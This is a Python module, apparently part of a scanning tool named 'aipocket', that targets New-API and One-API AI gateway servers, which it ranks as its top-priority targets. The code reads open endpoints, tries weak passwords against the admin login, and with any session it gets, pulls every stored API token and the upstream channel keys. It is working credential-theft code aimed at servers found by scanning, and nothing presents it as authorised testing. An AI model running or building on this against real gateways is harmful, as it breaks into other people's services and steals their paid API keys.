"""New-API prober — gateway token extraction.

New-API / One-API gateways are the #1 target in FINGERPRINTS.md (P0 priority).
  - GET /api/status → version info (confirms it's New-API)
  - GET /v1/models → model list (sometimes unauthenticated)
  - POST /api/user/login → weak password login → get session
  - GET /api/token/ → list all API tokens (admin only)
  - GET /api/channel/ → list all upstream channels with embedded keys (admin only)
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential
from ..base import WEAK_CREDENTIALS, Prober

log = logging.getLogger(__name__)


class NewAPIProber(Prober):
    product_name = "new-api"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "new-api" in blob or "new api" in blob or "newapi" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await _probe_gateway(self, hit, "newapi")


class OneAPIProber(Prober):
    """One-API is the upstream of New-API — same API surface."""

    product_name = "one-api"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "one api" in blob or "one-api" in blob or "oneapi" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await _probe_gateway(self, hit, "oneapi")


async def _probe_gateway(prober: Prober, hit: dict[str, Any], tag: str) -> list[Credential]:
    """Shared logic for New-API / One-API gateways (identical API surface)."""
    creds: list[Credential] = []

    # 1. Unauthenticated reads
    for path in ("/v1/models", "/api/status"):
        resp = await prober._get(prober._url(hit, path))
        found = prober._extract_from_response(resp, hit, f"{tag}_unauth_{path.strip('/').replace('/', '_')}")
        creds.extend(found)

    # 2. Weak-password login → authenticated reads
    session = await _try_login(prober, hit)
    if session:
        headers = {"Authorization": f"Bearer {session}"}
        for path in ("/api/token/", "/api/channel/", "/api/user/self"):
            resp = await prober._get(prober._url(hit, path), headers=headers)
            found = prober._extract_from_response(resp, hit, f"{tag}_authed_{path.strip('/').replace('/', '_')}")
            creds.extend(found)

    return creds


async def _try_login(prober: Prober, hit: dict[str, Any]) -> str:
    """Try weak credentials against /api/user/login, return session token."""
    url = prober._url(hit, "/api/user/login")
    if not url:
        return ""
    for username, password in WEAK_CREDENTIALS:
        resp = await prober._post(url, json={"username": username, "password": password})
        if resp is None or resp.status_code != 200:
            continue
        try:
            data = resp.json()
        except ValueError:
            continue
        # New-API/One-API returns {"success": true, "data": "<token>"}
        if data.get("success"):
            token = data.get("data", "")
            if isinstance(token, str) and token:
                log.debug("%s login success on %s with %s", "newapi", hit.get("host", ""), username)
                return token
    return ""
